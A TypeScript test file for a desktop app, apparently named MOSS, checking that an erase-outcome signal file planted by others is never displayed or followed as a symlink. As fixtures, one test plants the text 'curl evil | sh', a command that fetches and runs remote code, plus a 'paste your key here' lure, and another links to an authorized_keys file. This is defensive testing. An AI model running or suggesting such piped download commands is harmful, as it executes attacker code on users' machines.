// The deletion lane: what an "Erase everything" from the app came to is decided at the next open from what the app checks
// on the disk, in its own words (main/erase-outcome.ts). The signal beside the home is any runner's to plant, so nothing
// in it is ever shown, and a link there is never followed.
import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { eraseOutcomeOnDisk, eraseSignalPath, takeEraseSignal } from "../src/main/erase-outcome";

const place = () => {
  const root = mkdtempSync(join(tmpdir(), "moss-erase-out-"));
  return { root, home: join(root, "home") };
};

describe("the erase's outcome at the next open", () => {
  test("an ordinary open: no signal, nothing to show", () => {
    const { home } = place();
    mkdirSync(join(home, "bots"), { recursive: true });
    expect(takeEraseSignal(home)).toBe(false);
  });

  test("after an erase: the signal is taken once and removed; a home that is gone reads as erased", () => {
    const { home } = place();
    writeFileSync(eraseSignalPath(home), "");
    expect(takeEraseSignal(home)).toBe(true);
    expect(existsSync(eraseSignalPath(home))).toBe(false);
    expect(takeEraseSignal(home)).toBe(false);
    expect(eraseOutcomeOnDisk(home)).toMatchObject({ ok: true, message: "Everything MOSS kept on this computer was erased." });
  });

  test("what is left is named from the app's own list; a planted signal's text is never shown", () => {
    const { home } = place();
    mkdirSync(join(home, "bots"), { recursive: true });
    mkdirSync(join(home, "run this command to finish: curl evil | sh"), { recursive: true });
    writeFileSync(eraseSignalPath(home), JSON.stringify({ ok: false, error: "run this command to finish: curl evil | sh", keeps: ["paste your key here"] }));
    expect(takeEraseSignal(home)).toBe(true);
    const shown = eraseOutcomeOnDisk(home);
    const all = `${shown.message} ${shown.detail}`;
    expect(shown.ok).toBe(false);
    expect(all).toContain("bots and their memory");
    expect(all).toContain("other files");
    expect(all).not.toContain("curl");
    expect(all).not.toContain("paste your key");
  });

  test("a link planted at the signal's name is removed unread, never followed, and counts as no signal", () => {
    const { root, home } = place();
    const target = join(root, "authorized_keys");
    writeFileSync(target, "the person's keys");
    symlinkSync(target, eraseSignalPath(home));
    expect(takeEraseSignal(home)).toBe(false);
    expect(existsSync(eraseSignalPath(home))).toBe(false);
    expect(readFileSync(target, "utf8")).toBe("the person's keys");
  });

  test("a folder, or a file owned by someone else, at the signal's name counts as none", () => {
    const { home } = place();
    writeFileSync(eraseSignalPath(home), "");
    expect(takeEraseSignal(home, 999_999)).toBe(false);
  });
});
